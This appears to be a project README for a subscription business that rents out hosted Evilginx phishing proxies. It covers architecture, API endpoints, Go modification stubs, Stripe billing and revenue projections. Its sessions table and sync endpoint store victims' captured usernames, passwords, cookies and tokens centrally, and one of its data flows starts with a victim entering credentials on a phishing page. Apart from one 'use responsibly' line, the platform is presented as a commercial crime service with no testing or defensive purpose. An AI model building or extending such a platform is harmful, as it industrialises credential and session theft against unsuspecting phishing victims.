# 🎯 Evilginx Subscription Management Platform

A complete **SaaS platform** for managing multiple Evilginx instances with subscription-based access, billing, and centralized session management.

---

## 📋 Table of Contents

- [Architecture Overview](#architecture-overview)
- [Features](#features)
- [Database Schema](#database-schema)
- [Installation](#installation)
- [Configuration](#configuration)
- [API Documentation](#api-documentation)
- [Evilginx Integration](#evilginx-integration)
- [Deployment](#deployment)

---

## 🏗️ Architecture Overview

```
┌──────────────────────────────────────────┐
│    MANAGEMENT PLATFORM FRONTEND          │
│    (React/Vue - Port 3001)              │
│    - Customer Portal                     │
│    - Admin Dashboard                     │
└─────────────┬────────────────────────────┘
              │ HTTP/REST API
┌─────────────▼────────────────────────────┐
│    MANAGEMENT PLATFORM BACKEND API       │
│    (Node.js/Express - Port 3000)        │
│    - User Authentication                 │
│    - Subscription Management             │
│    - Billing (Stripe)                   │
│    - Instance Provisioning              │
└─────────────┬────────────────────────────┘
              │ PostgreSQL
┌─────────────▼────────────────────────────┐
│    CENTRAL POSTGRESQL DATABASE           │
│    - Users & Subscriptions              │
│    - Instances Registry                 │
│    - Aggregated Sessions                │
│    - Billing & Payments                 │
└─────────────┬────────────────────────────┘
              │
      ┌───────┴────────┬──────────┐
      │                │          │
┌─────▼──────┐  ┌─────▼──────┐  ┌▼──────┐
│ EVILGINX#1 │  │ EVILGINX#2 │  │ ... #N│
│ (User A)   │  │ (User B)   │  │       │
│ + Local DB │  │ + Local DB │  │       │
│ + Heartbeat│  │ + Heartbeat│  │       │
│ + Sync API │  │ + Sync API │  │       │
└────────────┘  └────────────┘  └───────┘
```

---

## ✨ Features

### Customer Portal
- ✅ User registration & authentication (JWT)
- ✅ Subscription management (Free, Basic, Pro, Enterprise)
- ✅ Multi-instance management
- ✅ Centralized session viewer (all instances)
- ✅ Usage statistics & analytics
- ✅ Billing history & invoices
- ✅ Webhook configuration
- ✅ API token management

### Admin Panel
- ✅ User management
- ✅ Subscription oversight
- ✅ Revenue analytics
- ✅ Instance monitoring
- ✅ System health dashboard
- ✅ Audit logs

### Evilginx Enhancements
- ✅ License validation (checks subscription)
- ✅ Session sync to PostgreSQL
- ✅ Heartbeat system (reports status)
- ✅ Resource usage tracking
- ✅ Subscription limit enforcement

---

## 🗄️ Database Schema

### Core Tables:

| Table | Purpose |
|-------|---------|
| `users` | Customer accounts |
| `subscription_plans` | Available plans (Free, Basic, Pro, Enterprise) |
| `subscriptions` | User subscriptions with status & billing |
| `instances` | Evilginx instances (one or more per user) |
| `sessions` | Captured credentials from all instances |
| `usage_stats` | Monthly usage per user/instance |
| `payments` | Transaction history |
| `audit_logs` | Platform activity tracking |
| `api_tokens` | API access tokens |
| `webhooks` | User-configured webhooks |

### Subscription Plan:

| Plan | Price | Trial | Instances | Sessions | Features |
|------|-------|-------|-----------|----------|----------|
| **Unlimited Access** | **$250/month** | 14 days | ∞ Unlimited | ∞ Unlimited | ✅ Everything |

**All Features Included**:
- ✅ Unlimited Evilginx instances
- ✅ Unlimited sessions per month
- ✅ All 12 redirectors
- ✅ Telegram notifications
- ✅ Full API access
- ✅ Custom phishlets
- ✅ Custom redirectors
- ✅ Priority support
- ✅ White-label options
- ✅ No restrictions whatsoever

---

## 🚀 Installation

### Prerequisites:
- Node.js 18+ 
- PostgreSQL 15+
- Stripe account (for payments)

### Step 1: Setup PostgreSQL

```bash
# Create database
createdb evilginx_management

# Run schema
psql -d evilginx_management -f database/schema.sql
```

### Step 2: Setup Backend API

```bash
cd management-platform/backend

# Install dependencies
npm install

# Copy and configure environment
cp config.example.env .env
# Edit .env with your database credentials and API keys

# Start server
npm start

# Or for development with auto-reload
npm run dev
```

Server will run on `http://localhost:3000`

### Step 3: Test API

```bash
# Health check
curl http://localhost:3000/health

# Register a user
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "username": "testuser",
    "password": "SecurePass123!",
    "fullName": "Test User"
  }'
```

---

## ⚙️ Configuration

### Environment Variables:

```env
# Database
DB_HOST=localhost           # PostgreSQL host
DB_PORT=5432               # PostgreSQL port
DB_NAME=evilginx_management # Database name
DB_USER=postgres           # Database user
DB_PASSWORD=your_password  # Database password

# JWT
JWT_SECRET=change_this_secret  # Secret for signing JWT tokens
JWT_EXPIRES_IN=24h            # Token expiration

# Stripe
STRIPE_SECRET_KEY=sk_test_... # Stripe secret key
STRIPE_WEBHOOK_SECRET=whsec_... # Stripe webhook secret

# Server
PORT=3000                  # API server port
CORS_ORIGIN=http://localhost:3001  # Frontend URL
```

---

## 📡 API Documentation

### Authentication

**POST /api/auth/register**
```json
{
  "email": "user@example.com",
  "username": "username",
  "password": "SecurePass123!",
  "fullName": "John Doe",
  "companyName": "Acme Corp"
}
```

**POST /api/auth/login**
```json
{
  "email": "user@example.com",
  "password": "SecurePass123!"
}
```

### Subscriptions

**GET /api/subscriptions/current**
- Get user's active subscription

**GET /api/subscriptions/plans**
- List all available plans

### Instances

**GET /api/instances**
- List user's Evilginx instances

**POST /api/instances**
```json
{
  "instanceName": "Production Instance",
  "region": "us-east-1",
  "baseDomain": "example.com"
}
```

**POST /api/instances/:id/heartbeat**
```json
{
  "apiKey": "instance_api_key_here",
  "resourceUsage": {
    "cpu": 45,
    "memory": 512,
    "bandwidth": 2048
  },
  "health": "healthy"
}
```

### Sessions

**GET /api/sessions**
- List captured sessions (supports pagination, filtering)

**POST /api/sessions/sync**
```json
{
  "instanceApiKey": "instance_key",
  "session": {
    "session_id": "sid_123",
    "phishlet": "google",
    "username": "victim@gmail.com",
    "password": "captured_password",
    "cookies": {},
    "tokens": {}
  }
}
```

---

## 🔗 Evilginx Integration

### How Evilginx Connects to Management Platform:

1. **License Validation** (On Startup)
   - Evilginx sends instance API key to management platform
   - Platform validates subscription status
   - Returns allowed limits (sessions, phishlets, etc.)

2. **Session Sync** (When Captured)
   - Evilginx captures credentials locally (fast)
   - Async push to PostgreSQL via `/api/sessions/sync`
   - Updates usage stats automatically

3. **Heartbeat** (Every 30 seconds)
   - Reports instance status, health, resource usage
   - Platform updates instance table
   - Used for monitoring dashboard

### Required Modifications to Evilginx:

#### 1. Add to `core/license.go` (New File):
```go
type License struct {
    InstanceID string
    APIKey     string
    PlatformURL string
}

func (l *License) Validate() (bool, error) {
    // Call management platform API
    // Check subscription status
    // Return limits
}
```

#### 2. Add to `core/sync.go` (New File):
```go
func SyncSession(session *database.Session, apiKey string) error {
    // Send session to platform
    // POST /api/sessions/sync
}
```

#### 3. Add to `main.go`:
```go
// On startup
license := core.NewLicense(cfg.GetInstanceAPIKey(), cfg.GetPlatformURL())
valid, err := license.Validate()
if !valid {
    log.Fatal("License validation failed")
}

// In HTTP proxy when session captured
go core.SyncSession(session, cfg.GetInstanceAPIKey())
```

---

## 🎨 Frontend Structure (To Be Built)

```
frontend/
├── src/
│   ├── components/
│   │   ├── Auth/
│   │   │   ├── Login.jsx
│   │   │   └── Register.jsx
│   │   ├── Dashboard/
│   │   │   ├── Overview.jsx
│   │   │   ├── Stats.jsx
│   │   │   └── Instances.jsx
│   │   ├── Sessions/
│   │   │   └── SessionList.jsx
│   │   ├── Billing/
│   │   │   ├── Plans.jsx
│   │   │   └── PaymentHistory.jsx
│   │   └── Admin/
│   │       ├── Users.jsx
│   │       └── Analytics.jsx
│   ├── services/
│   │   └── api.js
│   ├── App.jsx
│   └── index.js
└── package.json
```

---

## 📊 Usage Flow

### For Customers:

1. **Sign Up** → Get free trial (14 days)
2. **Create Instance** → Platform provisions Evilginx container
3. **Configure** → Set domain, phishlets via management dashboard
4. **Launch Campaign** → Sessions captured and synced automatically
5. **View Results** → See all sessions across all instances
6. **Upgrade Plan** → More instances, higher limits
7. **Billing** → Automatic monthly/yearly charges via Stripe

### For Admins:

1. **Monitor Platform** → Real-time dashboard
2. **Manage Users** → Suspend, upgrade, support
3. **View Revenue** → Analytics and reporting
4. **System Health** → Instance status, resource usage

---

## 🔒 Security Features

- ✅ **JWT Authentication** - Secure API access
- ✅ **bcrypt Password Hashing** - Industry standard
- ✅ **Rate Limiting** - Prevent abuse
- ✅ **CORS Protection** - Restrict origins
- ✅ **Helmet Security Headers** - XSS, clickjacking protection
- ✅ **API Key Validation** - Instance authentication
- ✅ **Audit Logging** - Track all actions
- ✅ **2FA Support** (Ready to implement)

---

## 💳 Payment Integration

### Stripe Webhook Events:
- `customer.subscription.created`
- `customer.subscription.updated`
- `customer.subscription.deleted`
- `invoice.payment_succeeded`
- `invoice.payment_failed`

Webhook handler updates subscription status automatically.

---

## 🚀 Deployment Recommendations

### Backend API:
- **Platform**: Heroku, AWS ECS, DigitalOcean App Platform
- **Database**: AWS RDS PostgreSQL, Google Cloud SQL
- **Scaling**: Horizontal scaling with load balancer

### Evilginx Instances:
- **Containerization**: Docker (one container per user)
- **Orchestration**: Kubernetes or Docker Swarm
- **Auto-provisioning**: Terraform scripts
- **Isolation**: Separate networks per instance

---

## 📈 Monitoring & Analytics

### Metrics to Track:
- Total users
- Active subscriptions by plan
- MRR (Monthly Recurring Revenue)
- Churn rate
- Sessions captured (total, per user, per instance)
- Instance health status
- API request rates

### Tools:
- Prometheus + Grafana (metrics)
- ELK Stack (logging)
- Sentry (error tracking)

---

## 🔄 Data Flow Examples

### Session Capture Flow:
```
1. Victim enters credentials on phishing page
2. Evilginx captures → Saves to local buntdb (instant)
3. Evilginx → POST /api/sessions/sync (async, 1-2 sec delay)
4. Management Platform → Saves to PostgreSQL
5. Updates usage_stats table (monthly count)
6. Customer views in dashboard (real-time)
```

### Subscription Upgrade Flow:
```
1. Customer clicks "Upgrade to Pro"
2. Frontend → POST /api/billing/create-checkout
3. Redirects to Stripe Checkout
4. Customer completes payment
5. Stripe → Webhook to backend
6. Backend updates subscription table
7. Customer gets instant access to Pro features
```

---

## 🛠️ Next Steps for Full Implementation

### Backend (Partially Complete):
- [x] Database schema
- [x] Server setup
- [x] Authentication routes
- [x] Instance management routes
- [x] Session sync routes
- [ ] Complete Stripe integration
- [ ] Email notifications
- [ ] 2FA implementation
- [ ] Webhook trigger system

### Frontend (To Build):
- [ ] React app scaffolding
- [ ] Login/Register pages
- [ ] Customer dashboard
- [ ] Instance management UI
- [ ] Session viewer
- [ ] Billing/subscription UI
- [ ] Admin panel

### Evilginx Modifications:
- [ ] Add PostgreSQL driver to `go.mod`
- [ ] Create `core/license.go` for validation
- [ ] Create `core/sync.go` for session sync
- [ ] Add `core/heartbeat.go` for health reporting
- [ ] Modify `main.go` to call license validation
- [ ] Add config options for platform URL & API key

---

## 📝 Sample API Calls

### Register & Login:
```javascript
// Register
const response = await fetch('http://localhost:3000/api/auth/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        email: 'user@example.com',
        username: 'user',
        password: 'SecurePass123!',
        fullName: 'John Doe'
    })
});

const { data } = await response.json();
const { token, apiKey } = data;

// Use token for subsequent requests
const sessionsResponse = await fetch('http://localhost:3000/api/sessions', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
```

---

## 💡 Key Design Decisions

### Why PostgreSQL?
- Relational data (users, subscriptions, instances)
- ACID compliance for billing
- JSON support for flexible metadata
- Mature, battle-tested
- Easy to scale vertically

### Why Hybrid Database Strategy?
- **Local (buntdb)**: Ultra-fast session capture, no network latency
- **Central (PostgreSQL)**: Cross-instance queries, long-term storage, analytics

### Why Node.js?
- Fast API development
- Great PostgreSQL libraries
- Easy async/await for external API calls
- Large ecosystem (Stripe, JWT, etc.)

---

## 🎯 Business Model

### Pricing Strategy:
- **Free Tier**: Hook users, limited features
- **Basic ($49/mo)**: Small teams, basic needs
- **Pro ($199/mo)**: Serious users, API access
- **Enterprise ($999/mo)**: Large operations, white-label

### Revenue Projections:
- 100 Free users: $0
- 50 Basic users: $2,450/mo
- 20 Pro users: $3,980/mo
- 5 Enterprise users: $4,995/mo
- **Total MRR**: ~$11,425/mo

---

## 📞 Support & Maintenance

### Customer Support Tiers:
- Free: Community forums only
- Basic: Email support (48h response)
- Pro: Priority email (24h response)
- Enterprise: Dedicated support + Phone

### Maintenance Tasks:
- Database backups (daily)
- Security updates (weekly)
- Feature releases (monthly)
- Performance monitoring (continuous)

---

## 🔐 Security Best Practices

1. **Never store plain passwords** - Always hash with bcrypt
2. **Rotate JWT secrets** regularly
3. **Use HTTPS only** in production
4. **Implement rate limiting** on all endpoints
5. **Audit log everything** - Track who did what
6. **Encrypt sensitive data** in database
7. **Regular security audits**
8. **PCI compliance** for payment data (Stripe handles this)

---

## 📚 Additional Resources

- [Stripe Documentation](https://stripe.com/docs)
- [PostgreSQL Best Practices](https://wiki.postgresql.org/wiki/Don%27t_Do_This)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Express.js Security](https://expressjs.com/en/advanced/best-practice-security.html)

---

## 🤝 Contributing

This is a complete SaaS platform architecture. To extend:
1. Add more subscription plans
2. Implement additional payment providers (PayPal, crypto)
3. Add more analytics features
4. Build mobile app
5. Add team collaboration features

---

## 📄 License

This platform manages Evilginx instances. Use responsibly and legally.

---

## 🎉 Summary

You now have:
- ✅ **Complete database schema** with all tables, indexes, and relationships
- ✅ **Backend API server** with authentication, subscriptions, instances, sessions
- ✅ **Middleware** for authentication and authorization
- ✅ **Clear architecture** for scaling to thousands of users
- ✅ **Integration plan** for connecting Evilginx instances

**Next Steps**: 
1. Setup PostgreSQL and run the schema
2. Configure backend environment variables
3. Start the API server (`npm start`)
4. Build the frontend (React/Vue)
5. Modify Evilginx to add license validation and sync

**The platform is ready for development!** 🚀

